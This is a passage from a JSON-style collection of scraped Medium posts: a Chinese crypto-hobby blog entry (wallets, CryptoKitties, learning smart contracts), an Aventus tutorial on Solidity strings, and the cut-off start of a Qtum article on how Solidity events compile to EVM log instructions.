Browser\uff08\u8b93\u6211\u51fa\u9580\u5728\u5916\u7528\u624b\u6a5f\u5373\u53ef\u8cb7\u8ce3\u52a0\u5bc6\u8c93\uff09\u800c\u4e14\u5b8c\u5168\u958b\u6e90\uff08GPL3\uff09\u7684\u4ee5\u592a\u5e63\u9322\u5305\uff1aStatus\u76ee\u524d\u9084\u5728 alpha \u968e\u6bb5\uff0c\u4f46\u4ecb\u9762\u6709\u9ede\u9177\u9177\u7684 https://status.im \u2014 \u4e00\u7a2e\u900f\u904e\u804a\u5929\u4ecb\u9762\u4f86\u73a9\u8f49\u4ee5\u592a\u5e63\u7684 APP\u3002Uphold \u662f\u88dd\u4e86 Brave \u4e26\u4e14\u8a8d\u771f\u73a9\u8d77\u4f86\u4e4b\u5f8c\u624d\u767c\u73fe\u7684\u3002\u56e0\u70ba\u525b\u525b\u63d0\u5230\u7684\u7db2\u8def\u885d\u6d6a\u8d08\u5e63\u670d\u52d9\uff0c\u5c31\u662f Brave \u5167\u5efa\u900f\u904e Uphold \u4f86\u9032\u884c\u3002Uphold \u662f\u4e00\u500b\u7dda\u4e0a\u96fb\u5b50\u9322\u5305\uff0c\u652f\u63f4\u591a\u7a2e\u8ca8\u5e63\u4ecb\u9762\u5e25\u6c23\uff0c\u53ef\u4ee5\u8f15\u9b06\u5237\u5361\u8cb7\u5e63\uff0c\u4e5f\u53ef\u4ee5\u8f15\u9b06\u51fa\u552e\u8f49\u56de\u6cd5\u5e63\uff08\u9700\u6709\u7f8e\u570b\u7f8e\u91d1\u5e33\u6236\uff09\u3002\u91cd\u9ede\u662f\uff0c\u5b83\u64c1\u6709\u5b8c\u6574\u7684 API \u548c Login Connect\uff0c\u63d0\u4f9b\u5176\u4ed6\u5e73\u53f0\u4f5c\u6578\u4f4d\u8ca8\u5e63\u66f4\u9032\u968e\u7684 FinTech \u91d1\u878d\u670d\u52d9\u3002Uphold \u7684\u4ecb\u9762\uff0c\u6bcf\u5f35\u4e0d\u540c\u8ca8\u5e63\u7684\u5361\u7247\u9084\u80fd\u63db\u5c01\u9762Uphold \u5e33\u6236\u53ef\u4ee5\u7528\u4f86\u767b\u5165\u4e00\u500b\u53eb\u505a Heleum \u7684\u81ea\u52d5\u6295\u8cc7\u5e73\u53f0\uff0c\u662f\u500b\u4ecb\u9762\u53ef\u611b\uff0c\u4f46\u670d\u52d9\u8a6d\u7570\u7684\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u628a\u5728 Uphold \u7684\u6cd5\u5e63\u6216\u6578\u4f4d\u8ca8\u5e63\u8cc7\u7522\u66ab\u6642\u8f49\u79fb\u5230 Heleum \uff0c\u800c Heleum \u6703\u66ff\u4f60\u81ea\u52d5\u64cd\u4f5c\u5c07\u8cc7\u91d1\u62ff\u53bb\u8cb7\u5e7e\u7a2e\u4e3b\u6d41\u7684\u865b\u64ec\u8ca8\u5e63\uff0c\u4e00\u6bb5\u6642\u9593\u7372\u5229\u4ee5\u5f8c\uff0c\u8ddf\u4f60\u4e94\u4e94\u5206\u5e33\u3002\uff08\u8a72\u4e0d\u6703\u9019\u5c31\u662f\u60e1\u540d\u662d\u5f70\u7684\u62c6\u5206\u76e4\u3001\u8cc7\u91d1\u76e4\uff1f@@\uff09\u5bf6\u535a\u58eb\u500b\u6027\u5167\u5411\u5c0f\u5fc3\uff0c\u5c0d\u9019\u7a2e\u4e82\u4e03\u516b\u7cdf\u7528\u9322\u7684\u5e73\u53f0\u4e00\u5411\u8b39\u614e\uff0c\u76ee\u524d\u53ea\u5148\u5c0f\u5c0f\u6e2c\u8a66\u4e86 50 \u7f8e\u91d1\uff0c\u9694\u5169\u4e09\u500b\u6708\u518d\u4f86\u8ddf\u5927\u5bb6\u5831\u544a\u5f8c\u679c\u3002\u751f\u4e86\u5e7e\u96bb\u65b0\u8c93\u6211\u7684\u8c93\u7c43\uff1a https://www.cryptokitties.co/profile/0x12a0e25e62c1dbd32e505446062b26aecb65f028\u52a0\u5bc6\u8c93\u76ee\u524d\u5df2\u7d93\u63a8\u51fa\u4e2d\u6587\u7248\uff0c\u53eb\u505a \u201c\u8b0e\u6200\u8c93\u201d\u3002\u7ffb\u8b6f\u5f97\u4e0d\u932f\u3002\u5927\u5bb6\u6709\u7a7a\u53ef\u4ee5\u73a9\u73a9\u3002\u767c\u73fe\u4e86\u4e00\u500b\u9999\u6e2f\u767c\u7684\u5e63 LikeCoin\u4ecb\u9762\u4f5c\u7684\u4e0d\u932f\uff0c\u76ee\u524d\u767b\u5165\u5c31\u9001 8 LikeCoin\uff0c\u5176\u958b\u767c\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u4f5c\u70ba\u8d0a\u52a9\u5275\u4f5c\u8005\u5c08\u7528\u7684\u6578\u4f4d\u8ca8\u5e63\u548c\u5e73\u53f0\u3002\u7528\u8d77\u4f86\u883b\u9806\uff0c\u4f5c\u8005\u770b\u4f86\u4e5f\u5f88\u7528\u5fc3\uff08\u65b0\u5e74\u7d05\u5305\u888b\u5f88\u5e25\uff09\uff0c\u4e0d\u904e\u8207\u700f\u89bd\u5668\u5167\u5efa\u5167\u5bb9\u8d0a\u52a9\u5e63\uff08Brave & BAT\uff09\u6216 Medium or Facebook \u54ea\u5929\u4e5f\u4f86\u767c\u5e63\u76f8\u6bd4\uff0c\u5c31\u6709\u9ede\u4ee4\u4eba\u7dca\u5f35\u4e86\u3002https://likecoin.store/\u601d\u8003\u4e86\u70ba\u4f55\u5f88\u96e3\u641c\u5c0b\u5230\u6b63\u78ba\u800c\u6709\u7528\u7684\u667a\u80fd\u5408\u7d04\u958b\u767c\u6559\u5b78\u9019\u5e7e\u5929\u627e\u4e86\u5f88\u591a\u8ddf\u667a\u80fd\u5408\u7d04\u958b\u767c\u6709\u95dc\u7684\u8cc7\u6599\uff0c\u5e7e\u5929\u524d\u624d\u8a8d\u70ba\u597d\u50cf\u627e\u4e0d\u5230\u597d\u7528\u800c\u6b63\u78ba\u7684\uff0c\u4f46\u624d\u904e\u5169\u5929\uff0c\u4e0d\u77e5\u70ba\u4f55\u7adf\u7136\u5c31\u53c8\u627e\u5230\u4e86\u5f88\u591a\u597d\u7528\u800c\u6b63\u78ba\u7684\uff0c\u6709\u5f88\u591a\u751a\u81f3\u662f\u4e00\u5169\u5e74\u524d\u7684\u820a\u6587\uff0c\u600e\u6a23\u8aaa\u90fd\u4e0d\u61c9\u8a72\u7b2c\u4e00\u6b21\u641c\u5c0b\u6c92\u641c\u5c0b\u5230\u2026\u3002\u7e3d\u4e4b\uff0c\u9019\u548c\u6211 Google \u627e\u5c0b\u5176\u4ed6\u8cc7\u6599\u6216\u77e5\u8b58\u6559\u5b78\u7684\u7d93\u9a57\u6709\u5f88\u5927\u7684\u843d\u5dee\uff0c\u5dee\u7570\u5927\u5230\u8b93\u6211\u958b\u59cb\u89ba\u5f97\u6709\u5169\u7a2e\u53ef\u80fd\uff1a\u7576\u7136\u6709\u80fd\u662f\u6211\u4e0d\u6703\u641c\uff0c\u6c92\u627e\u5c0d\u65b9\u5411\u3002\u4f46\u8aaa\u771f\u7684\uff0c\u6211\u8d85\u6703\u627e\u8cc7\u6599\uff0c\u9019\u500b\u6a5f\u7387\u5176\u5be6\u9817\u4f4e\u3002Google \u5c0d\u65bc\u300c\u5168\u65b0\u7684\u96dc\u4e82\u77e5\u8b58\u300d\u7684\u641c\u5c0b\u548c\u5efa\u6a94\u4e26\u4e0d\u5728\u884c\u3002\u56e0\u70ba\u76ee\u524d\u6709\u5728\u73a9\u667a\u80fd\u5408\u7d04\u958b\u767c\u7684\u4eba\uff08\u548c\u5176\u4ed6\u77e5\u8b58\u76f8\u6bd4\uff09\u9084\u662f\u592a\u5c11\uff0c\u6240\u4ee5\u6bcf\u7bc7\u6559\u5b78\u90fd\u6c92\u6709 \u4ec0\u9ebc \u201c\u6700\u591a\u4eba\u95b1\u8b80\u7d00\u9304\u201d \u53ef\u4f9b\u6bd4\u8f03\uff0c\u6bcf\u7bc7\u4e5f\u8a31\u95b1\u8b80\u9ede\u64ca\u7684\u4eba\u90fd\u4e0d\u591a\uff0c\u8b80\u8005\u985e\u578b\u4e5f\u5dee\u4e0d\u591a\uff0c\u9019\u9ebc\u4e00\u4f86\uff0c\u7d2f\u8a08\u7684\u8b80\u8005\u884c\u70ba\u5c0d\u65bc\u6587\u7ae0\u7684\u201c\u91cd\u8981\u5ea6\u5340\u9694\u201d\u4e5f\u5c31\u6c92\u6709\u5f37\u70c8\u7684\u52a0\u5206\u4f5c\u7528\uff0c\u9801\u9762\u548c\u9801\u9762\u4e4b\u9593\u7684\u4e92\u76f8\u9023\u7d50\u4e5f\u5c11\uff0c\u6240\u4ee5\u76f8\u5f62\u4e4b\u4e0b\u627e\u5c0b\u4e00\u500b\u8a72\u65b0\u77e5\u8b58\u7684\u7279\u5b9a\u65b9\u5411\u7684 \u201c\u7b54\u6848\u201d\u5c31\u8b8a\u5f97\u5341\u5206\u56f0\u96e3\u4e86\uff0c\u6bcf\u6b21 Google \u6311\u9078\u51fa\u4f86\u7684\u7d50\u679c\u4e5f\u5c31\u8b8a\u5f97\u98c4\u5ffd\u4e0d\u5b9a \u2014 \u6c92\u6709\u77e5\u8b58\u9738\u4e3b\u3002\u4ee5\u592a\u574a Ethereum \u57fa\u91d1\u6703\u672c\u4f86\u5c31\u4e0d\u5e0c\u671b\u4eba\u4e82\u5b78\u5408\u7d04\u4e82\u767c\u5e63 \u2014 \u600e\u9ebc\u80fd\u8b93\u4e00\u5806\u4e2d\u4e8c\u958b\u767c\u8005\u4e82\u5b78\u4e82\u767c\u4e2d\u4e8c\u5e63\u5462\uff1f\u53c8\uff0c\u600e\u80fd\u5920\u505a\u5230\u4e0d\u8b93\u4e00\u5806\u4eba\u6563\u767c\u4e00\u5806\u4e2d\u4e8c\u5e63\u5462\uff1f\u5f88\u7c21\u55ae\uff0c\u90a3\u5c31\u662f\u4e00\u76f4\u4e0d\u65b7\u7684\u5347\u7d1a\u3001\u4fee\u6539\u667a\u80fd\u5408\u7d04\u8a9e\u8a00 Solidity \uff0c\u4e0d\u65b7\u758a\u4ee3\u3002\u57fa\u672c\u4e0a\uff0c\u5982\u679c\u4f60\u554f\u4e00\u500b Ethereum / Solidity \u4e00\u500b\u958b\u767c\u4e0a\u7684\u554f\u984c\uff0c\u591a\u534a\u4f60\u6703\u5f97\u5230\u7684\u7b54\u6848\u90fd\u662f\uff1a\u7db2\u8def\u4e0a\u7684\u8cc7\u8a0a\u90fd\u8d85\u820a\uff0c\u5f88\u591a\u932f\u3002\u9019\u4e9b\u539f\u56e0\u6216\u8a31\u90fd\u9020\u6210\u4e86 \u73a9\u5e63\u5f88\u5bb9\u6613\uff0c\u767c\u5e63\u5f88\u56f0\u96e3\uff08\u4f46\u5be6\u969b\u4e0a\u5f88\u7c21\u55ae\uff09\uff0c\u73a9\u5408\u7d04\u7684\u4eba\u66f4\u5c11 \u7684\u73fe\u8c61\uff1f\u7e3d\u7b97\u767c\u73fe\u4e00\u7bc7\u5f88\u4e0d\u932f\u7684\u667a\u80fd\u5408\u7d04\u6559\u5b78\u6587\u7ae0\u5728\u4e00\u500b\u5f88\u4e0d\u932f\u7684\u5e73\u53f0 Hashnode \u767c\u73fe\u4e86\u9019\u7bc7\u6587\u7ae0\uff1aHow to build your own Ethereum based ERC20 Token and launch an ICO in next 20 minuteshttps://hashnode.com/post/how-to-build-your-own-ethereum-based-erc20-token-and-launch-an-ico-in-next-20-minutes-cjbcpwzec01c93awtbij90uzn\u8a72\u6587\u7ae0\u4f5c\u8005\uff0c\u4e5f\u662f Hashnode \u5e73\u53f0\u7684\u5275\u8fa6\u4eba\uff0c\u6b63\u5728\u8457\u624b\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u6559\u5b78\u96fb\u5b50\u66f8\u300aMastering Smart Contracts\u300b\uff0c\u4e00\u672c\u7f8e\u91d1 $9.99\uff08\u8d77\uff09\u81ea\u7531\u8a8d\u8cfc\u3002\u6211\u8cb7\u4e86\u4e00\u672c\u3002\u4e26\u767c\u73fe\u4e86\u597d\u50cf\u662f\u6b63\u898f\u7684\u667a\u80fd\u5408\u7d04\u958b\u767c\u65b9\u6cd5\uff1a Truffleframework + OpenZepplin + Ganache\u3002\uff08\uff1f\uff09\u9084\u627e\u5230\u4e86\u53ef\u80fd\u662f\u52a0\u5bc6\u8c93 CryptoKitties \u7576\u5e74\u53c3\u8003\u7684\u6559\u5b78\uff1a Ethereum Pet Shop \u2014 Your First Dapp | Truffle Suite\u5b8c\u6210\u4e86 CryptoZombies DApp \u958b\u767c\u6559\u5b78\u7b2c\u4e00\u7ae0CryptoZombies \u662f Solidity \u7dda\u4e0a\u7de8\u8f2f\u5e73\u53f0 Ethfiddle.com \u70ba\u4e86\u63a8\u5ee3\u4ee5\u592a\u574a\u53ca Solidity \u7de8\u7a0b\u77e5\u8b58\u6240\u5275\u9020\u7684\u514d\u8cbb\u5b78\u7fd2\u8ab2\u7a0b\u3002\u7adf\u7136\u6709\u4e2d\u6587\uff01https://cryptozombies.io/zh/course\u597d\u73a9\u597d\u5b78\u3002\u64da\u8aaa\u4e0a\u5b8c\u8ab2\u5c31\u53ef\u4ee5\u81ea\u5df1\u6253\u9020\u4e00\u500b\u52a0\u5bc6\u8c93\u670d\u52d9\uff01\u7b2c\u4e00\u7ae0\u4e0a\u5b8c\u5f8c\uff0c\u5275\u4e86\u5169\u96bb\u53ef\u611b\u5c0f\u6bad\u5c4d\uff0c\u4e00\u96bb\u662f\u300c\u5bf6\u535a\u58eb\u5927\u5927\u300d\u53e6\u4e00\u96bb\u53eb\u300c\u5bf6\u535a\u58eb\u592a\u592a\u300dXDCheck out my CryptoZombie \u5b9d\u535a\u58eb\u5927\u5927!\u5b78\u6703\u4e86 FB Messenger ChatBot \u9023\u7d50 Google Document Spreadsheet \u7684\u65b9\u6cd5\u76f8\u7576\u6709\u8da3\uff0c\u6559\u5b78\u5728\u6b64\uff1ahttps://medium.com/vessels/chatfuel-google-sheets-zapier-8de5c988d10b\u4ee5\u5f8c\u5c31\u53ef\u4ee5\u7528\u81c9\u66f8\u804a\u5929\u6a5f\u5668\u4eba\u8490\u96c6\u8cc7\u6599\u5566\u3002\u76ee\u524d\u6b63\u5728\u9032\u884c\u4e00\u500b\u8a08\u756b\uff0c\u8981\u8b93 FB \u6709\u85cd\u52fe\u52fe\u7684\u4eba\u5229\u7528 ChatBot \u804a\u5929\u76f4\u63a5\u9032\u884c KYC \u8eab\u5206\u8a8d\u8b49\uff0c\u6709\u9019\u500b\u65b9\u6cd5\u5c31\u7c21\u55ae\u591a\u4e86\uff01\u958b\u555f\u4e86\u4e00\u500b\u65b0\u8a08\u5283\uff1aCryptoFaces\u548c\u65b0\u8a8d\u8b58\u7684\u81fa\u5927\u5b78\u5f1f\u5171\u540c\u958b\u555f\u4e86\u9019\u500b\u8a08\u756b\u3002\u8a08\u756b\u5167\u5bb9\u5148\u4fdd\u5bc6\uff0c\u4f46\u7e3d\u4e4b\u4f60\u53ef\u4ee5\u5148\u73a9\u73a9\u770b\u9019\u500b\u6709\u8da3\u7684\u6771\u897f\uff1a https://roger-wu.github.io/crypto-roger/https://roger-wu.github.io/crypto-roger/\u7c21\u8a00\u4e4b\u5462\uff0c\u5b83\u662f\u4e00\u500b\u53ef\u4ee5\u300c\u628a\u81ea\u5df1\u4e0a\u67b6\u5230\u5340\u584a\u93c8\u4e0a\uff0c\u4f9b\u4eba\u4ea4\u6613\u300d\u7684\u670d\u52d9\u3002\u800c\u4e14\u5b83\u5957\u7528\u7684\u4ea4\u6613\u6a21\u578b\u53c3\u8003\u4e86 CryptoCountries \uff0c\u5341\u5206\u985e\u4f3c\u67d0\u7a2e\u9a19\u5c40\u4f46\u53c8\u4e0d\u662f\uff1aCryptoCountries \u4e00\u8a00\u4ee5\u853d\u4e4b\u662f\u4e00\u500b\u300c\u8cfc\u8cb7\u865b\u64ec\u570b\u5bb6\uff0c\u4e26\u671f\u5f85\u4e0b\u4e00\u500b\u4eba\u82b1\u66f4\u591a\u9322\u8cb7\u4e0b\u5b83\u300d\u7684\u904a\u6232\uff0c\u4e00\u500b\u570b\u5bb6\u7684\u50f9\u683c\u5f9e 0.001 ETH \u958b\u59cb\uff0c\u4e00\u500b\u73a9\u5bb6\u8cb7\u4e0b\u5b83\u4e4b\u5f8c\u4fbf\u80fd\u66ab\u6642\u64c1\u6709\u9019\u500b\u570b\u5bb6\uff0c\u73a9\u5bb6\u7684\u540d\u5b57\u6703\u51fa\u73fe\u5728\u90a3\u500b\u570b\u5bb6\u7684 Owner \u6b04\u4f4d\uff0c\u540c\u6642\u50f9\u683c\u6703\u4e0a\u5347100%\u8b8a\u62100.002 ETH\u3002\u5225\u7684\u73a9\u5bb6\u53ef\u4ee5\u4ed8\u9322\u7d66\u4e0a\u4e00\u500b\u64c1\u6709\u8005\u4f86\u8cb7\u4e0b\u9019\u500b\u570b\u5bb6\uff0c\u4e4b\u5f8c\u50f9\u683c\u6703\u518d\u4e0a\u5347100%\u8b8a\u62100.004 ETH\uff0c\u7b49\u5f85\u4e0b\u4e00\u500b\u73a9\u5bb6\u8cb7\u4e0b\u5b83\uff0c\u4e00\u76f4\u91cd\u8907\u4e0b\u53bb\u3002\u904e\u7a0b\u4e2d\u6bcf\u4e00\u500b\u8cfc\u8cb7\u8005\u90fd\u80fd\u7372\u5f97100%\u7684\u6536\u76ca\uff0c\u800c\u5012\u9709\u7684\u6700\u5f8c\u4e00\u96bb\u8001\u9f20\u5247\u6703\u627f\u53d7\u9245\u984d\u7684\u8667\u640d\u3002\u2014 Roger Wu \u5340\u584a\u93c8\u904a\u6232\u7684\u65b0\u71b1\u6f6e\uff1a\u985e\u9f90\u6c0f\u9a19\u5c40\u904a\u6232\u96d6\u7136\u6709\u9ede\u602a\uff0c\u4f46\u662f\u9817\u597d\u73a9\u3002\u81ea\u5f9e\u5bf6\u535a\u58eb\u6295\u8cc7\u4e86 Roger 0.001 \u4ee5\u592a\u5e63\u4e4b\u5f8c\uff0c\u4ed6\u53ef\u662f\u6f32\u4e86\u597d\u5e7e\u500d\u5462\uff08\u7b11\uff09\u3002\u7e3d\u4e4b\uff0cCryptoFaces \u5e74\u5f8c\u958b\u5de5\uff01\u5e0c\u671b\u5f88\u5feb\u80fd\u8ddf\u5927\u5bb6\u5206\u4eab\u5566\uff01\u5e0c\u671b\u5927\u5bb6\u80fd\u5f9e\u5bf6\u535a\u58eb\u7684\u6587\u7ae0\u88e1\uff0c\u770b\u898b\u4e00\u4e9b\u4f60\u672c\u4f86\u4e5f\u60f3\u770b\uff0c\u6216\u8005\u672c\u4f86\u4e0d\u77e5\u9053\u537b\u60f3\u77e5\u9053\u7684\u6d88\u606f\u3002\u795d\u5927\u5bb6\u65b0\u5e74\u5feb\u6a02\uff01\u72d7\u5e74\u65fa\u798f\uff01\ud83d\udc36\u5982\u679c\u672c\u6587\u5c0d\u4f60\u6709\u5e6b\u52a9\uff0c\u8acb\u5e6b\u5fd9\u6309\u5e7e\u4e0b\u62cd\u638c\ud83d\udc4f\u6309\u9215\uff08\u6700\u591a\u53ef\u62cd50\u4e0b\uff09\u62cd\u5f97\u8d8a\u591a\uff0c\u5bf6\u535a\u58eb\u5c31\u80fd\u591a\u559d\u5e7e\u676f\u5496\u5561\u3002\u4e5f\u6b61\u8fce\u8a3b\u518a\u5f8c\u8ffd\u8e64\u3001Follow \u6211\u3002\u5bf6\u535a\u58eb\u611f\u8b1d\u60a8 \ud83d\ude47\u200d", "responses": 3, "tags": ["Ethereum", "Solidity", "Crypto", "Cryptocurrency", "Futarchy"]}, {"title": "Working with Strings in Solidity", "post_link": "https://blog.aventus.io/working-with-strings-in-solidity-473bcc59dc04?source=search_post", "author_name": "Aventus Network", "author_link": "https://blog.aventus.io/@aventus", "publish_date": "2018-07-06", "last_modified_date": "2018-10-15", "readtime": "8.52", "claps": 731, "voters": 88, "content": "Working with Strings in SolidityAventus NetworkFollowJul 6, 2018 \u00b7 9 min readThis is the first in a series of blogs we\u2019re going to bring to you directly from the trenches, going into some of the nitty-gritty technical detail of some of the things we\u2019re doing with the Protocol at the moment.Today\u2019s article comes from Alex Pinto, a recent addition to our blockchain engineering team who\u2019s been spending the past few weeks getting up to speed on using Solidity, and will take us through some of the challenges and particularities of the language.Today I give you a post about programming for the Ethereum blockchain using the Solidity language. I won\u2019t follow any plan in doing this: my objective is only to write about my obstacles in learning this language and the practical difficulties I encounter in my daily work.I want the freedom to write about any topic without having first to introduce preliminary material, as I\u2019d have to do if I were writing a textbook. If you notice me talking about things I have not explained before, that is by design. Leave me a comment below and I\u2019ll come back to them in a later post.Basic accessToday, I want to talk about strings in Solidity. Solidity is, at first, similar in syntax to Javascript and other C-like languages. Because of that, it is easy for a newcomer with a grounding in one of several common and widespread languages to get a quick grasp of what a Solidity program does. Nevertheless, Solidity is mighty in the proverbial details that hide unforeseen difficulties. That is the case of the type string and the related type bytes.Both of these are dynamic array types, which means that they can store data of an arbitrary size. Each element of a variable of type bytes is, unsurprisingly, a single byte. Each element of a variable of type string is a character of the string. So far so good, but the initial looks are deceiving. One who comes from other languages might expect the string type to provide several useful functions, like:determining the string\u2019s lengthreading or changing the character at a given location in the stringjoining two stringsextracting part of a stringBad news: Solidity\u2019s string does none of this! If we need any of the above, we have to do it manually.So, let\u2019s explore some of these difficulties and see what we can do about them. I open Remix and type the following code in a new file called string.sol.The right side of the screen, in Remix, is taken by the developer\u2019s area. In the Compile tab, I check the Auto-Compile option, so that Remix will notify me of errors and code-analysis warnings as I write my code. The static code-analysis is controlled by the options in the tab Analysis, and I usually have all options selected.In the current case, Remix will report two warnings of the same kind: the methods I have written can potentially have a high-to-infinite gas cost. I will ignore that in this post.The above contract is very minimal. It defines a state variable store of type string, a method to set it and a method to get it. Let\u2019s test it.In the Run tab, I hit Deploy and if there are no problems with the contract, a new area will appear below that button with the address where the contract is located and the functions that are available.Below the working area, Remix shows a detailed record of the transaction\u2019s result. Initially, it shows only a line indicating the account that deployed the contract, the contract and method that was called, ie String.(constructor), and how much Ether was passed to the execution (initially this is shown in Wei, which is the smallest unit of Ether, corresponding to 10^-18 Ether). We can expand it by clicking over the header, revealing logs, execution and transaction costs, available gas, final result, etc.At this point, I just want to press the button getStore on the right, and notice how that shows beneath it the result:Likewise, there is a new transaction log on the left and by clicking it we can see:in the decoded output. All is well.Now, I type \u201c0123456789\u201d in the textbox to the right of setStore and hit that button. Then I call getStore again and I receive that string. Thumbs up, we can do basic storage/retrieval with strings!Let\u2019s now go for more interesting things.Creating new strings: data locationSo far, I have accessed a literal string and we have seen how we can change it by assigning to it. But that is only a very coarse way of dealing with strings. Let us create a string character by character. This will introduce us to one peculiarity of Solidity programming: data location.I create a new method that only returns a new string with three specific characters: \u201cAbc\u201d.This is a well-intentioned effort, but does not work. Remix is kind enough to immediately point 4 errors and 1 warning:Two of these are on the same line: string newString = new string(3);Warning: Variable is declared as a storage pointer. Use an explicit \u201cstorage\u201d keyword to silence this warning.TypeError: Type string memory is not implicitly convertible to expected type string storage pointerThe other three occur in the following lines, eg newString[0] = \"A\"; and are all of the same type:TypeError: Index access for string is not possible.To understand the first issue, I have to tell you about data location. Writing to the blockchain is very expensive. Every node that runs the transaction has to do the same writing, which makes the transaction more expensive and the blockchain bigger. When a node downloads a block containing this transaction, it will incur larger storage costs because of this writing. In Ethereum, every transaction has an associated cost, called gas, to incentivise programmers to be as economic as possible.When writing a contract, authors have a choice of what kind of data to use: memory is cheap (i.e. it costs relatively low gas, but the data are volatile and lost after a function finishes executing); storage is the most expensive (and is absolutely needed for contract state, which must persist from function call to function call); there is also a calldata location (that corresponds to the values in the stack frame of a function that is executing). This is the cheapest location to use, but it has a limited size. In particular, that means that functions may be limited in their number of arguments.Every data type has a default location. This is from the Solidity documentation:Forced data location:-parameters (not return) of external functions: calldata-state variables: storageDefault data location:-parameters (also return) of functions: memory-all other local variables: storageNotice the subtlety: function parameters are by default stored in memory, except if the function is external, in which case they will be stored in the stack (ie calldata). This means that a function that is perfectly alright when public can suddenly have too many arguments when made external.Now, let\u2019s come back to our code and examine the linestring newString = new string(3);This is a local variable inside the function, and so by default it is in storage. The new keyword is used to specify the initial size of a memory dynamic array. Memory arrays cannot be resized. On the other hand, we can change the size of a storage dynamic array by changing its lengthproperty, but can\u2019t use new with them.This is the source of our error. In this case, all we want to do with this string is create it and return it to the outside. Let the outside world decide what to do with it, and whether it is temporary only or important enough to persist on the blockchain. In this example, the storage is not important, and the string will be created in memory. To do that, we add the memory keyword in the declaration, like this:string memory newString = new string(3);Direct access to strings: equivalence with bytesLet\u2019s see the second sort of errors now. This is simple and unavoidable: Solidity does not currently allow index access to strings. From the FAQ:string is basically identical to bytes only that it is assumed to hold the UTF-8 encoding of a real string. Since string stores the data in UTF-8 encoding it is quite expensive to compute the number of characters in the string (the encoding of some characters takes more than a single byte). Because of that,string s; s.length;is not yet supported and not even index access s[2]The alternative is to first transform the string into bytes, and then access it directly. This works because string is an array type, albeit with some restrictions.But there is a trap to watch out for. bytes stores raw data; string stores UTF-8 characters. The following code does not always return the number of characters in _s:The problem here occurs if _s contains any character that takes more than 1 byte to represent in UTF. In that case, the function returns the length of the byte representation of the input string, and will be more than the number of characters.This has also an impact when trying to address a particular character of the string, as we cannot predict at which location the character\u2019s bytes will be. We have to parse the string linearly identifying any multi-byte character, or else make sure we restrict our input to characters of fixed length. If we work exclusively with ASCII strings, for example, we\u2019ll be safe.Returning to our previous function, this works:But for example, the following code which tries to set the third character of a string to X, will fail when it receives multi-byte characters.This returns \u201cAbXdef\u201d for an input of \u201cAbcdef\u201d, but returns \u201cXb\u00c1n\u00e7!\u201d for an input of \u201c\u20acb\u00c1n\u00e7!\u201dConclusionThere are still many more things that can be said about this topic, but this is a long enough post already, so I\u2019ll wrap up. The key concept regarding the type string is that this is an array of UTF-8 characters, and can be seamlessly converted to bytes. This is the only way of manipulating the string at all. But it is important to note that UTF-8 characters do not exactly match bytes. The conversion in either direction will be accurate, but there is not an immediate relation between each byte index and the corresponding string index.For most things, there may be an advantage in representing the string directly as the type bytes (avoiding conversions) and be very careful when using characters that are encoded in UTF by more than one byte.That\u2019s enough for now. See you another day, with more steps in this coding adventure.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.", "responses": 2, "tags": ["Programming", "Blockchain", "Solidity", "Aventus", "Ethereum"]}, {"title": "How Solidity Events Are Implemented \u2014 Diving Into The Ethereum VM Part 6", "post_link": "https://blog.qtum.org/how-solidity-events-are-implemented-diving-into-the-ethereum-vm-part-6-30e07b3037b9?source=search_post", "author_name": "Howard", "author_link": "https://blog.qtum.org/@hayeah", "publish_date": "2018-01-21", "last_modified_date": "2018-10-12", "readtime": "12.5", "claps": 891, "voters": 81, "content": "How Solidity Events Are Implemented \u2014 Diving Into The Ethereum VM Part 6HowardFollowJan 21, 2018 \u00b7 13 min readYou\u2019ll need a bloom filter to find the hat you wantIn How To Decipher A Smart Contract Method Call we\u2019ve learned how \u201cmethod\u201d is an abstraction built on top of simpler EVM primitives like \u201cjump\u201d and \u201ccomparison\u201d instructions.In this article, we will take a deep dive into Solidity Events. In the wild, there are three main uses for event logs:As ersatz return values, because a transaction does not record a method\u2019s return values.As a kind of cheaper alternative data storage, as long as the contract does not need access to it.Finally, as events that DApp clients can subscribe to.Event logging is a relatively complex language feature. But like methods, they map to much simpler EVM logging primitives.By understanding how events are implemented with lower level EVM instructions, and how much they cost, we\u2019ll gain a better intuition for using events effectively.If you are new to this series, the previous articles:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.What is going on when a new contract is created.Solidity EventsA Solidity event looks something like this:event Deposit(    address indexed _from,    bytes32 indexed _id,    uint _value);It has the name Deposit.It has three parameters, of different types.Two of these types are \u201cindexed\u201d.One parameter is not \u201cindexed\u201d.There are two quirky limitations to Solidity events:There may be at most 3 indexed parameters.If the type of an indexed parameter is larger than 32 bytes (i.e. string and bytes), the actual data isn\u2019t stored, but rather the KECCAK256 digest of the data is stored.Why is this so? And what is the difference between indexed and non-indexed parameters?EVM Log PrimitivesTo start to understand these quirks and limitations of Solidity events, let\u2019s look at the log0, log1, ..., log4 EVM instructions.The EVM logging facility uses different terminologies than Solidity:\u201ctopics\u201d: There may be up to 4 topics. Each topic is exactly 32 bytes.\u201cdata\u201d: The data is the payload of the event. It may be arbitrary number of bytes.How does a Solidity event map to a log primitive?All the \u201cnon-indexed parameters\u201d of an event is stored as the data.Each of the \u201cindexed parameters\u201d of an event is stored as a 32 bytes topic.Since string and bytes can be longer than 32 bytes, if they are indexed, Solidity would store KECCAK256 digest instead of the actual data.Solidity lets you have at most 3 indexed arguments, but EVM lets you have at most 4 topics. It turns out that Solidity consumes one topic for the event\u2019s signature.The log0 PrimitiveThe simplest logging primtiive is log0. This creates a log item that only has data, but no topic. The data of logs can be an arbitrary number of bytes.We can use log0 directly in Solidity. In this example, we'll store a 32 bytes number:pragma solidity ^0.4.18;contract Logger {  function Logger() public {    log0(0xc0fefe);  }}The generated assembly can be divided into two halves. The first half copies the log data (0xc0fefe) from stack into memory. The second half puts arguments on stack for the log0 instruction, telling it where in memory to load the data.The annotated assembly:memory: { 0x40 => 0x60 }tag_1:  // copy data into memory  0xc0fefe    [0xc0fefe]  mload(0x40)    [0x60 0xc0fefe]  swap1    